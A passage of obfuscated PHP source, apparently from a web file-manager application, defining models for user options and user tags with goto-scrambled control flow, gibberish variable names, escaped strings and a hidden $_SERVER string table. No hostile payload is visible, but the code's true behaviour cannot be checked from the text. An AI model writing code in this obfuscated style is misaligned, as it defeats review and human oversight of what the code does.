$bæéÖÛÅõ®[8]) . $bæéÖÛÅõ®[754] . md5($a²×Â­äó‘) . $bæéÖÛÅõ®[755]; return file_exists($CŒºˆÓùÚæ); } public function unlock($Bøˆ—¬”œ) { goto açĞ…Â¾ÉÒ; f¼¤°ÙÑº¯: @flock($Fõ„Ğ…¼Œ¯[$AØí¿½…º‰[757]], LOCK_UN); @fclose($Fõ„Ğ…¼Œ¯[$AØí¿½…º‰[757]]); @unlink($Fõ„Ğ…¼Œ¯[$AØí¿½…º‰[164]]); goto F¯í’ŠÙòË; açĞ…Â¾ÉÒ: $AØí¿½…º‰ =& $_SERVER[‘®…¢À]; $Fõ„Ğ…¼Œ¯ = self::$caches[$Bøˆ—¬”œ]; if (!$Fõ„Ğ…¼Œ¯) { return; } goto f¼¤°ÙÑº¯; F¯í’ŠÙòË: unset(self::$caches[$Bøˆ—¬”œ]); goto B¡¾‹¡¹¢; B¡¾‹¡¹¢: } } goto EÛ›²÷À„²; C¾äÈËŸ®: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\162\x5f\x6f\160\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($e¥•½ºŒŠÈ) { return "\125\163\x65\x72\117\x70\164\x69\x6f\156\x5f{$e¥•½ºŒŠÈ}\137" . USER_ID; } protected function filterWhere($F›ƒåöãÇ¹) { $F›ƒåöãÇ¹[$_SERVER[‘®…¢À][1337]] = USER_ID; return $F›ƒåöãÇ¹; } public function cacheRemoveUser($A†í–õÈ‡ç, $EæÂÉÃ¸†Ş) { return Cache::remove("\125\163\x65\x72\117\x70\164\x69\157\156\137{$A†í–õÈ‡ç}\137" . $EæÂÉÃ¸†Ş); } protected function optionDefault($Eƒˆ®ïõåè = '') { $fŒ„òÖ±…Ş =& $_SERVER[‘®…¢À]; if ($Eƒˆ®ïõåè == $fŒ„òÖ±…Ş[33]) { return $GLOBALS[$fŒ„òÖ±…Ş[6]][$fŒ„òÖ±…Ş[2408]]; } if ($Eƒˆ®ïõåè == $fŒ„òÖ±…Ş[2409]) { return $GLOBALS[$fŒ„òÖ±…Ş[6]][$fŒ„òÖ±…Ş[2410]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\56\164\x61\x67\114\x69\163\x74"; public $modelType = "\x55\163\145\x72\x4f\160\164\x69\x6f\156"; public $field = array("\x6e\x61\155\145", "\x73\164\171\154\145", "\x73\157\x72\x74"); public function listData($FÜ–õõ®Š¸ = false, $A¡²ø¸µá = "\x73\157\162\164", $bğï¾Ë§ß­ = false) { return parent::listData($FÜ–õõ®Š¸, $A¡²ø¸µá, $bğï¾Ë§ß­); } public function remove($cÁè±ƒ¾) { return parent::remove($cÁè±ƒ¾); } public function add($DŒÍ¤ÜÜ‚ù, $E›‰ÎÁœË¯ = "\x6c\141\x62\x65\x6c\55\147\x72\145\x79\55\156\x6f\x72\155\141\154") { $fÎÒßµ†óÌ =& $_SERVER[‘®…¢À]; if ($this->findByName($DŒÍ¤ÜÜ‚ù)) { return !1; } $f’À°èè™Œ = array($fÎÒßµ†óÌ[382] => $DŒÍ¤ÜÜ‚ù, $fÎÒßµ†óÌ[432] => $E›‰ÎÁœË¯, $fÎÒßµ†óÌ[2004] => $this->getSort($fÎÒßµ†óÌ[243]) + 1); return parent::insert($f’À°èè™Œ); } public function update($E¥¥Õ˜ĞÎÚ, $cõİ‹õšòÚ) { $Dé¹ÇÀƒâ¯ =& $_SERVER[‘®…¢À]; $bÉ¸¢ÅÔñÓ = $this->listData($E¥¥Õ˜ĞÎÚ); $d†Áçà¾µì = $this->findByName($cõİ‹õšòÚ[$Dé¹ÇÀƒâ¯[28]]); if (!$bÉ¸¢ÅÔñÓ || $d†Áçà¾µì && $d†Áçà¾µì[$Dé¹ÇÀƒâ¯[363]] != $bÉ¸¢ÅÔñÓ[$Dé¹ÇÀƒâ¯[363]]) { return !1; } return parent::update($E¥¥Õ˜ĞÎÚ, $cõİ‹õšòÚ); } public function moveTop($b¦Ä…ƒ–ˆ‹) { $c‚Ù‰× ˜ô =& $_SERVER[‘®…¢À]; $Eßº×¡Éùù = parent::listData(); $aíŠ•‘«ôÚ = $this->getSort($c‚Ù‰× ˜ô[242]); foreach ($Eßº×¡Éùù as &$f‚ÓŠ«±÷Ò) { if ($f‚ÓŠ«±÷Ò[$c‚Ù‰× ˜ô[363]] == $b¦Ä…ƒ–ˆ‹) { $f‚ÓŠ«±÷Ò[$c‚Ù‰× ˜ô[2021]] = $aíŠ•‘«ôÚ; continue; } $f‚ÓŠ«±÷Ò[$c‚Ù‰× ˜ô[2021]] += 1; } return parent::resetData($Eßº×¡Éùù); } public function moveBottom($d®¦ššÇ±È) { $cë‚³µôÁ” =& $_SERVER[‘®…¢À]; $e—¦·Ï˜š = $this->getSort($cë‚³µôÁ”[243]) + 1; return parent::update($d®¦ššÇ±È, array($cë‚³µôÁ”[2021] => $e—¦·Ï˜š)); } public function resetSort($DåèÔ‰) { $a¥†ÙÑó‡Ò =& $_SERVER[‘®…¢À]; $E¶¡´‰§÷ø = array(); for ($eôÓ¥Ö”‚ = 0; $eôÓ¥Ö”‚ < count($DåèÔ‰); $eôÓ¥Ö”‚++) { $E¶¡´‰§÷ø[$DåèÔ‰[$eôÓ¥Ö”‚] . $a¥†ÙÑó‡Ò[33]] = $eôÓ¥Ö”‚ + 1; } $c™ÉŠø˜‘© = parent::listData(); foreach ($c™ÉŠø˜‘© as &$EéÓÊ–™ôŸ) { $DÓĞ”êà­ = $E¶¡´‰§÷ø[$EéÓÊ–™ôŸ[$a¥†ÙÑó‡Ò[363]]]; $EéÓÊ–™ôŸ[$a¥†ÙÑó‡Ò[2021]] = $DÓĞ”êà­ ? $DÓĞ”êà­ : $EéÓÊ–™ôŸ[$a¥†ÙÑó‡Ò[2021]]; } return parent::resetData($c™ÉŠø˜‘©); } private function getSort($f¯…Œ®Ìó«) { $cÄ‰›ô‰†‘ =& $_SERVER[‘®…¢À]; $C³ù†”Ñ†Ô = parent::listData(); $FÖŒ÷Íä“ = array_to_keyvalue($C³ù†”Ñ†Ô, $cÄ‰›ô‰†‘[33], $cÄ‰›ô‰†‘[2021]); if (!$FÖŒ÷Íä“) { $FÖŒ÷Íä“ = array(0); } $eøÈ»œ‹Öî = $f¯…Œ®Ìó« == $cÄ‰›ô‰†‘[243] ? max($FÖŒ÷Íä“) : min($FÖŒ÷Íä“); return intval($eøÈ»œ‹Öî); } } goto EÀïÓ»¬; FÂ§­·µƒ½: define($_SERVER[‘®…¢À][1829], 1); define($_SERVER[‘®…¢À][1830], 2); define($_SERVER[‘®…¢À][1831], 3); goto cİÒË¡²¿; EÀïÓ»¬: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\x66\x61\166"; protected function cacheFunctionAlias($D´•–“ÒÉ­) { $FŸš¥ˆ®…œ =& $_SERVER[‘®…¢À]; return array($FŸš¥ˆ®…œ[2355] => array(USER_ID, $FŸš¥ˆ®…œ[2411])); } protected function listData() { $Cª÷±Ÿ§¥ =& $_SERVER[‘®…¢À]; $dÁëÑÔĞË– = array($Cª÷±Ÿ§¥[1328] => USER_ID, $Cª÷±Ÿ§¥[431] => array($Cª÷±Ÿ§¥[2412], 0)); $EÑ’õŸæÕË = $Cª÷±Ÿ§¥[2413]; $Fø¾ò š‡± = $Cª÷±Ÿ§¥[2414]; $DÙ¥ÖÜìá = $this->field($EÑ’õŸæÕË)->where($dÁëÑÔĞË–)->order($Fø¾ò š‡±)->select(); return $DÙ¥ÖÜìá ? $DÙ¥ÖÜìá : array(); } protected function listByTag($b ·ˆØÏ³à) { } protected function addToTag($AÎ””ÑêÏò, $C¼”Ï‚íï) { $B´•Ü‹ğ¹‹ =& $_SERVER[‘®…¢À]; if (!Model($B´•Ü‹ğ¹‹[2199])->listData($C¼”Ï‚íï) || !Model($B´•Ü‹ğ¹‹[735])->pathInfo($AÎ””ÑêÏò)) { return !1; } $D—ˆÏ‚‹·· = array($B´•Ü‹ğ¹‹[1328] => USER_ID, $B´•Ü‹ğ¹‹[431] => $C¼”Ï‚íï, $B´•Ü‹ğ¹‹[383] => $AÎ””ÑêÏò, $B´•Ü‹ğ¹‹[384] => $B´•Ü‹ğ¹‹[378], $B´•Ü‹ğ¹‹[382] => $B´•Ü‹ğ¹‹[33], $B´•Ü‹ğ¹‹[2004] => 0); if ($this->where($D—ˆÏ‚‹··)->find()) { return !1; } return $this->add($D—ˆÏ‚‹··); } protected function removeFromTag($D·¸Âñâéã, $fÒÅ¸ ìØ) { $f¿½¯§Î• =& $_SERVER[‘®…¢À]; if (!Model($f¿½¯§Î•[2199])->listData($fÒÅ¸ ìØ) || !Model($f¿½¯§Î•[735])->pathInfo($D·¸Âñâéã)) { return !1; } $EÔŸ‘ÊÍ = array($f¿½¯§Î•[1328] => USER_ID, $f¿½¯§Î•[431] => $fÒÅ¸ ìØ, $f¿½¯§Î•[384] => $f¿½¯§Î•[378], $f¿½¯§Î•[383] => $D·¸Âñâéã); return $this->where($EÔŸ‘ÊÍ)->delete(); } protected function removeByTag($aŒ®ìÉªÓ) { $Aù¥¨•®ŠÉ =& $_SERVER[‘®…¢À]; if (!$aŒ®ìÉªÓ) { return !1; } $F‰Æ‡„Â†è = array($Aù¥¨•®ŠÉ[1328] => USER_ID, $Aù¥¨•®ŠÉ[431] => $aŒ®ìÉªÓ); return $this->where($F‰Æ‡„Â†è)->delete(); } protected function removeBySource($CÃàÃ½µğ­) { $fƒ½Ë„Ú·‰ =& $_SERVER[‘®…¢À]; $b—Œ¿÷¸í¸ = array($fƒ½Ë„Ú·‰[1328] => USER_ID, $fƒ½Ë„Ú·‰[383] => $CÃàÃ½µğ­, $fƒ½Ë„Ú·‰[431] => array($fƒ½Ë„Ú·‰[909], 0)); return $this->where($b—Œ¿÷¸í¸)->delete(); } }